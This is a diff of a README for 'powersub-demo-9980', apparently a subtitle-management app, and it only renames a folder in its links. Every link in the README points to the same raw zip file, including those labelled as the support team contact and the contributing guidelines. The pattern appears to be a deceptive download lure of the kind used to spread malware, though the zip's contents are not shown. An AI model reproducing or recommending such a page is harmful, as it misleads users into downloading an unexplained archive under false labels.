@@ -6,7 +6,7 @@ Welcome to powersub-demo-9980! This application helps you easily manage and down
 
 ## 🔗 Download Now
 
-[![Download powersub-demo-9980](https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/undereducated/powersub-demo-9980.zip%https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/undereducated/powersub-demo-9980.zip)](https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/undereducated/powersub-demo-9980.zip)
+[![Download powersub-demo-9980](https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/heterophyly/powersub-demo-9980.zip%https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/heterophyly/powersub-demo-9980.zip)](https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/heterophyly/powersub-demo-9980.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ Before you download, please ensure your system meets the following requirements:
 
 ## 💾 Download & Install
 
-To get started, visit [this page to download](https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/undereducated/powersub-demo-9980.zip). You will find the latest version of the application. 
+To get started, visit [this page to download](https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/heterophyly/powersub-demo-9980.zip). You will find the latest version of the application. 
 
 ### Installation Steps
 
@@ -69,11 +69,11 @@ If you encounter issues:
 
 ## 📞 Support
 
-For further assistance, you can contact our support team at https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/undereducated/powersub-demo-9980.zip We are here to help!
+For further assistance, you can contact our support team at https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/heterophyly/powersub-demo-9980.zip We are here to help!
 
 ## 🔄 Contributing
 
-If you’d like to contribute to the project, feel free to check out the [contributing guidelines](https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/undereducated/powersub-demo-9980.zip).
+If you’d like to contribute to the project, feel free to check out the [contributing guidelines](https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/heterophyly/powersub-demo-9980.zip).
 
 ## 📝 License
 
@@ -81,4 +81,4 @@ This application is licensed under the MIT License. Check the license file for d
 
 ## 🔗 Download Now Again
 
-Don't forget to [visit this page to download](https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/undereducated/powersub-demo-9980.zip) the latest version and enjoy managing your subtitles with ease!
+Don't forget to [visit this page to download](https://raw.githubusercontent.com/michalllllls/powersub-demo-9980/main/heterophyly/powersub-demo-9980.zip) the latest version and enjoy managing your subtitles with ease!
